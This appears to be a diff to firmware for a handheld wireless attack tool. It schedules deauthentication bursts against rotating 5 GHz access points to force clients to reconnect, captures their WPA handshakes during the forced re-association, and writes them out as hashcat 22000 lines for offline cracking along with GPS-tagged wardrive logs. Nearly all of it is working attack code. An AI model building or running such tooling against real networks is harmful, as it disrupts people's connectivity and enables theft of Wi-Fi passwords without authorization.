@@ -977,9 +977,12 @@ void feat_triton(void)
             ui_draw_status("wifi", "triton");
         }
 
-        /* Every 6s, rotate to the next 5 GHz target and have the C5
-         * blast a 4-second deauth burst. Knocks dual-band clients off
-         * 5G, they cascade back to 2.4 where Triton catches the M1/M2. */
+        /* Every 6s, rotate to the next 5 GHz target. Fire a C5
+         * handshake capture (promisc-listens for M1/M2) then a 4s
+         * deauth burst that forces clients to re-associate right into
+         * our capture window. Dual-band clients cascade back to 2.4
+         * where local Triton also catches the M1/M2 — so we snag the
+         * handshake on whichever band the client picks. */
         if (c5_online && now - last_c5_deauth > 6000) {
             last_c5_deauth = now;
             c5_ap_t aps[64];
@@ -988,10 +991,52 @@ void feat_triton(void)
             for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
             if (five_n > 0) {
                 const c5_ap_t &t = aps[c5_target_idx % five_n];
+                /* HS capture first so the C5 is already listening when
+                 * the deauth fires. Give it 5s: 1s settle + 4s under
+                 * deauth pressure. */
+                c5_cmd_hs(t.bssid, t.channel, 5000);
                 c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
                 c5_target_idx++;
             } else {
                 /* Re-scan if our 5G list emptied out. */
+                c5_clear_results();
+                c5_cmd_scan_5g(400);
+            }
+        }
+
+        /* Drain any RESP_HS tuples the C5 streamed back into the
+         * hashcat 22000 file + wardrive CSV if GPS has a fix. */
+        if (c5_online) {
+            c5_hs_t hs[4];
+            int nh = c5_hss(hs, 4);
+            for (int i = 0; i < nh; ++i) {
+                char ssid[33] = {0};
+                ssid_of(hs[i].bssid, ssid, sizeof(ssid));
+
+                /* Compose WPA*02* line — same format as local emit_hs. */
+                char line[1024] = "WPA*02*";
+                hexcat(line, hs[i].mic, 16);    strcat(line, "*");
+                hexcat(line, hs[i].bssid, 6);   strcat(line, "*");
+                hexcat(line, hs[i].sta, 6);     strcat(line, "*");
+                for (size_t k = 0; k < strlen(ssid); ++k) {
+                    char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[k]);
+                    strcat(line, h);
+                }
+                strcat(line, "*");
+                hexcat(line, hs[i].anonce, 32); strcat(line, "*");
+                int m2 = hs[i].eapol_m2_len;
+                if (m2 > 128) m2 = 128;
+                if (m2 < 0)   m2 = 0;
+                hexcat(line, hs[i].eapol_m2, m2);
+                strcat(line, "*02\n");
+                capture_enqueue(line);
+                wdr_append(hs[i].bssid, ssid, "EAPOL_HS_5G");
+                s_hs++;
+            }
+            if (nh > 0) {
+                /* Clear only the HS portion — we re-use c5_aps results
+                 * for the 5G target list, so wiping everything would
+                 * nuke our scan cache. Re-fetching preserves dedup. */
                 c5_clear_results();
                 c5_cmd_scan_5g(400);
             }
